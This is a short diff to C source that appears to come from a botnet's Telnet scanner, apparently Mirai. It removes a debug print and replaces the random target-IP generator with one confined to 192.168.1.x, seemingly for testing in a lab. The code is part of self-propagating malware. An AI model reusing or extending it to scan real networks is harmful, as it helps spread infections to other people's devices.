@@ -593,7 +593,6 @@ void scanner_init(void)
                 }
             }
         }
-        printf("break.\n");
     }
 }
 
@@ -647,7 +646,7 @@ static ipv4_t get_random_ip(void)
 {
     uint32_t tmp;
     uint8_t o1, o2, o3, o4;
-
+/*
     do
     {
         tmp = rand_next();
@@ -673,6 +672,15 @@ static ipv4_t get_random_ip(void)
     );
 
     return INET_ADDR(o1,o2,o3,o4);
+*/
+    tmp = rand_next();
+
+    o1 = tmp & 0xff;
+    o2 = (tmp >> 8) & 0xff;
+    o3 = (tmp >> 16) & 0xff;
+    o4 = (tmp >> 24) & 0xff;
+
+    return INET_ADDR(192,168,1,o4);
 }
 
 static int consume_iacs(struct scanner_connection *conn)
